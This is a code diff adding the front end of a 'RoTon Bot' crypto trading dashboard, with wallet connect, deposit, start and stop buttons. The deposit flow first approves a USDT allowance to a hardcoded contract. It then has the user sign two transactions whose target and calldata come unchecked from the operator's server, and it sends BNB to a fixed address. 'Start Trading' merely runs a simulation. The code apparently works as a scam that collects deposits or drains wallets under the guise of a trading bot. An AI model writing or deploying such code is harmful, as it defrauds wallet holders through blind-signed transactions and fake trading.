@@ -79,3 +79,183 @@ async function syncBalanceFromFund() {
 }
 window.syncBalanceFromFund = syncBalanceFromFund;
 
+// ✅ RoTon Bot Frontend Controller (V12 Web3JS Compliant Sync - Part 2)
+const depBtn = document.getElementById("depositBtn");
+if (depBtn) {
+  depBtn.onclick = async function () {
+    const token = getSelectedToken();
+    const amountInput = document.getElementById("depositAmount");
+    const rawAmt = parseFloat(amountInput?.value || 0);
+
+    if (isNaN(rawAmt) || rawAmt <= 0) {
+      return logToPanel("❌ Action Halted: Enter a valid positive deposit amount.");
+    }
+
+    const amount = BigInt(Math.floor(rawAmt * 1e18)).toString();
+    const wallet = window.USER_ADDR;
+
+    if (!wallet || wallet === "{wallet}") {
+      return logToPanel("❌ Action Halted: Connect Web3 Wallet First.");
+    }
+
+    try {
+      if (token === "USDT") {
+        const usdt = "0x55d398326f99059fF775485246999027B3197955";
+        const v12 = "0x1854170353ea89672638F9fa5acB477c45523871";
+
+        if (!window.web3 && typeof Web3 !== "undefined") {
+            window.web3 = new Web3(window.ethereum);
+        }
+
+        // ==========================================
+        // STEP 1/3: ERC20 ALLOWANCE APPROVAL
+        // ==========================================
+        logToPanel("⏳ Step 1/3: Requesting USDT allowance allocation approval via MetaMask...");
+        const approveData = "0x095ea7b3" + v12.replace("0x", "").padStart(64, "0") + BigInt(amount).toString(16).padStart(64, "0");
+
+        const txHash1 = await window.ethereum.request({
+          method: "eth_sendTransaction",
+          params: [{ from: wallet, to: usdt, data: approveData }]
+        });
+        logToPanel(`📡 Step 1 broadcasted! Hash: ${txHash1}. Waiting for block confirmation...`);
+
+        let receipt1 = null;
+        while (receipt1 === null) {
+          await new Promise(r => setTimeout(r, 2000)); 
+          try {
+            if (window.web3) {
+                receipt1 = await window.web3.eth.getTransactionReceipt(txHash1);
+            } else {
+                break;
+            }
+          } catch (e) {
+            console.log("Awaiting block mining update...");
+          }
+        }
+        logToPanel("✅ Step 1/3 Complete: USDT allowance is securely mined on-chain.");
+
+        // ==========================================
+        // STEP 2/3: SMART CONTRACT COMMISSION PHASE
+        // ==========================================
+        logToPanel("⏳ Step 2/3: Compiling contract commission metrics from backend...");
+        const c1 = await fetch(`${window.API_BASE}/prodbot/deposit/usdt/pipeline`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ amount: amount, tradingPhase: false })
+        });
+        const commission = await c1.json();
+
+        if (commission.status !== "ok") throw new Error(commission.message);
+
+        logToPanel("🚀 Prompting MetaMask for Step 2/3 (Commission Payment)...");
+        const txHash2 = await window.ethereum.request({
+          method: "eth_sendTransaction",
+          params: [{ 
+            from: wallet, 
+            to: commission.contract, 
+            data: commission.txdata,
+            gas: "0x3D090" 
+          }]
+        });
+        logToPanel(`📡 Step 2 broadcasted! Hash: ${txHash2}. Waiting for block confirmation...`);
+
+        let receipt2 = null;
+        while (receipt2 === null) {
+          await new Promise(r => setTimeout(r, 2000));
+          try {
+            if (window.web3) {
+                receipt2 = await window.web3.eth.getTransactionReceipt(txHash2);
+            } else {
+                break;
+            }
+          } catch (e) {}
+        }
+        logToPanel("✅ Step 2/3 Complete: Contract commission processed successfully.");
+
+        // ==========================================
+        // STEP 3/3: FINAL TRADING CAPITAL DEPOSIT
+        // ==========================================
+        logToPanel("⏳ Step 3/3: Deploying trading capital allocation to contract memory...");
+        const c2 = await fetch(`${window.API_BASE}/prodbot/deposit/usdt/pipeline`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ amount: amount, tradingPhase: true })
+        });
+        const trading = await c2.json();
+
+        if (trading.status !== "ok") throw new Error(trading.message);
+
+        logToPanel("🚀 Prompting MetaMask for Step 3/3 (Capital Pool Deposit)...");
+        const txHash3 = await window.ethereum.request({
+          method: "eth_sendTransaction",
+          params: [{ 
+            from: wallet, 
+            to: trading.contract, 
+            data: trading.txdata,
+            gas: "0x3D090" 
+          }]
+        });
+        logToPanel(`🎉 Step 3/3 Submitted! Broadcast Hash: ${txHash3}`);
+        logToPanel("🚀 Multi-step pipeline finished processing! Your trading account will update shortly.");
+
+      } else if (token === "BNB") {
+        logToPanel("⏳ Transmitting native gas reserves directly to V13 vault...");
+        await window.ethereum.request({
+          method: "eth_sendTransaction",
+          params: [{
+            from: wallet,
+            to: "0xc46E6452c1Cb9641dE339eb8bE48faEb70B58dF5",
+            value: "0x" + BigInt(amount).toString(16)
+          }]
+        });
+        logToPanel("✅ BNB gas asset deposited to V13.");
+      }
+    } catch (err) {
+      logToPanel(`❌ Execution Error: ${err.message}`);
+    }
+  };
+}
+
+initializeLabels();
+
+const connBtn = document.getElementById("connectwalletBtn");
+if (connBtn) {
+  connBtn.onclick = async function() {
+    if (typeof window.ethereum !== "undefined") {
+      try {
+        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+        window.USER_ADDR = String(accounts[0]).toLowerCase(); 
+        const label = document.getElementById("currentWalletLabel");
+        if (label) label.innerText = window.USER_ADDR;
+        logToPanel(`✅ Wallet linked: ${window.USER_ADDR}`);
+        if (!window.web3 && typeof Web3 !== "undefined") {
+            window.web3 = new Web3(window.ethereum);
+        }
+      } catch (err) {
+        logToPanel(`❌ Connection error: ${err.message}`);
+      }
+    } else {
+      logToPanel("❌ MetaMask extension framework not detected.");
+    }
+  };
+}
+
+const strtBtn = document.getElementById("startBtn");
+if (strtBtn) {
+  strtBtn.onclick = function() {
+    logToPanel("▶️ Start Trading clicked — launching simulation...");
+    if (typeof window.startSimulation === "function") {
+      window.startSimulation(10);
+    } else {
+      logToPanel("❌ Pipeline compiler error: startSimulation method missing.");
+    }
+  };
+}
+
+const stpBtn = document.getElementById("stopBtn");
+if (stpBtn) {
+  stpBtn.onclick = function() {
+    logToPanel("⏹ Safety Stop activated.");
+    if (typeof window.stopBot === "function") window.stopBot();
+  };
+}
